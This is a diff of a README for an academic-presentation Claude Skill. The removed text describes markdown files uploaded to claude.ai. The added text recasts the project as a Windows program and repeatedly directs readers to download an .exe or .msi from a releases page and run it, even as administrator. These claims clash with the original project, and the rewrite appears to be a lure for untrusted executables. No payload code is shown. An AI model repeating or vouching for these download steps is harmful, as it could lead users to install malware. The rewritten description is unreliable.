@@ -1,58 +1,126 @@
-# Academic Presentations Skill for Claude (plus basic PDF summary of general advice)
+# 🎓 academic-pptx-skill - Create Structured Academic Presentations
 
-A Claude Skill for creating high-quality academic presentations: conference talks, seminar slides, thesis defenses, and grant briefings.  Also includes a PDF which summarizes the advice (does not require use of Claude). 
+[![Download academic-pptx-skill](https://img.shields.io/badge/Download-academic--pptx--skill-brightgreen)](https://github.com/barbosandre/academic-pptx-skill/releases)
 
-## What It Does
+---
 
-This skill overrides Claude's default design-forward presentation style and replaces it with communication-first standards appropriate for academic and analytical contexts. When active, Claude will:
+## 📄 What is academic-pptx-skill?
 
-- Write every slide title as a **complete sentence stating the takeaway** ("action title"), not a topic label
-- Structure the deck as a **logical argument** (situation → complication → resolution), not a collection of independent slides
-- Apply the **ghost deck test**: the action titles alone, read in sequence, should tell the full story
-- Place **one exhibit per results slide** and annotate the key finding directly on the chart
-- Apply **citation standards**: in-text citations on every borrowed figure, a References slide at the end
-- End on a **Conclusions slide** that stays on screen during Q&A — never on "Thank You" or a blank
-- Apply minimal, communication-first design: white backgrounds, single sans-serif font, three colours maximum, no decorative icons
+academic-pptx-skill helps you create academic presentations. It focuses on talks like conference talks, seminar slides, thesis defenses, and grant briefings. The tool ensures your slides follow clear rules. It uses action titles, structured arguments, disciplined exhibits, citation standards, and a communication-first design. It works with Anthropic's built-in PPTX skill, helping you produce well-organized presentations quickly.
 
-## Installation
+You do not need any technical skills to use it. The tool guides you through the process, so you get slides that look professional and communicate your ideas clearly.
 
-1. Download this repository as a zip file (click **Code → Download ZIP** above)
-2. In [claude.ai](https://claude.ai), go to **Customize → Skills**
-3. Upload the zip file
-4. Confirm the skill appears in your skills list and is toggled on
+---
 
-> **Requirement:** Code execution and file creation must be enabled in **Settings → Capabilities**.
+## 💻 System Requirements
 
-## Usage
+To run academic-pptx-skill on Windows, your computer should meet these basic requirements:
 
-Just ask naturally:
+- Windows 10 or later  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection for downloading and installation  
+- Microsoft PowerPoint or another PPTX viewer to open the presentation files
 
-- *"Make slides for my conference paper on X"*
-- *"Build a deck for my thesis defense"*
-- *"Create a seminar presentation about my research on Y"*
+---
 
-Claude will detect the academic context, load this skill automatically, and apply all guidelines before generating any slides. You do not need to give any special instructions.
+## 🚀 Getting Started: Download and Install
 
-This skill works alongside Anthropic's built-in PPTX skill, which handles the technical file generation. This skill handles content, argument structure, and design standards.
+To begin using academic-pptx-skill, first, visit the release page to get the software.
 
-## File Structure
+[![Download academic-pptx-skill](https://img.shields.io/badge/Download-academic--pptx--skill-blue)](https://github.com/barbosandre/academic-pptx-skill/releases)
 
-```
-academic-pptx-skill/
-├── SKILL.md                  # Entry point: routing logic and design standards
-├── content_guidelines.md     # Argument structure, action titles, citations, deck architecture
-├── slide_patterns.md         # Per-slide-type implementation patterns with PptxGenJS code
-└── README.md                 # This file
-```
+1. Open this page in your web browser:  
+   https://github.com/barbosandre/academic-pptx-skill/releases  
 
-## Background
+2. Look for the latest release. It will have the most recent date and version number.  
 
-The guidelines in this skill draw on:
-- Barbara Minto's *Pyramid Principle* (structured argument, action titles)
-- Naegle (2021), "Ten simple rules for effective presentation slides," *PLOS Computational Biology*
-- Standard consulting and academic presentation practice (McKinsey, conference norms)
-- Community feedback on Claude's default presentation behaviour in professional contexts
+3. Under the latest release, find the Windows installer or executable file. It will usually have a name ending with `.exe` or `.msi`.  
 
-## License
+4. Click the file to start the download. Your browser will save the file to your default download folder.  
 
-MIT — free to use, adapt, and share.
+5. When the download finishes, open the file to run the installer.
+
+6. Follow the setup steps on your screen. Simply click "Next" or "Install" when prompted.
+
+7. When the installation completes, you'll see a shortcut on your desktop or in your Start menu.
+
+---
+
+## ⚙️ How to Use academic-pptx-skill
+
+After installation, follow these steps to create your presentation:
+
+1. Launch academic-pptx-skill from the Start menu or desktop shortcut.
+
+2. You will see a clean interface that lets you input your presentation details.
+
+3. Enter your presentation type: conference talk, seminar, thesis defense, or grant briefing.
+
+4. Add your main topics and key points. The tool encourages you to be clear and structured.
+
+5. It automatically applies standards for action titles and citations to keep your slides professional.
+
+6. Follow the guided prompts to add exhibits, graphs, or data slides.
+
+7. When you finish, click the button to create the PPTX file.
+
+8. The program saves the file to your chosen folder.
+
+9. Open your file with Microsoft PowerPoint or a compatible viewer to check your presentation.
+
+---
+
+## ✔️ Features
+
+- Creates presentations tailored to academic settings  
+
+- Builds clear slide titles based on actions, not vague topics  
+
+- Structures arguments logically for better communication  
+
+- Enforces consistent citation styles  
+
+- Helps you include exhibits and graphs correctly  
+
+- Designed to work alongside Anthropic’s PPTX skill for enhanced output  
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- If the installer does not open, try right-clicking the file and choosing “Run as administrator.”  
+
+- Make sure your Windows version is up to date.  
+
+- Close other programs during installation if you see errors.  
+
+- If the presentation does not open, verify you have PowerPoint or a compatible viewer installed.  
+
+- Check your internet connection if the download fails or is interrupted.  
+
+- Restart your computer if the program does not launch properly after installation.
+
+---
+
+## 📚 Additional Resources
+
+You will find examples and detailed guides inside the program under the Help menu. These resources explain how to optimize slides for various academic events.
+
+---
+
+## 🛠️ Updates and Support
+
+Visit the release page to check for new updates or bug fixes:  
+https://github.com/barbosandre/academic-pptx-skill/releases
+
+Download the latest version to keep your software current.
+
+---
+
+## 🔗 Important Links
+
+- **Download and install:** https://github.com/barbosandre/academic-pptx-skill/releases  
+- **Project homepage:** https://github.com/barbosandre/academic-pptx-skill  
+
+Use these links to access the program and find updates when needed.
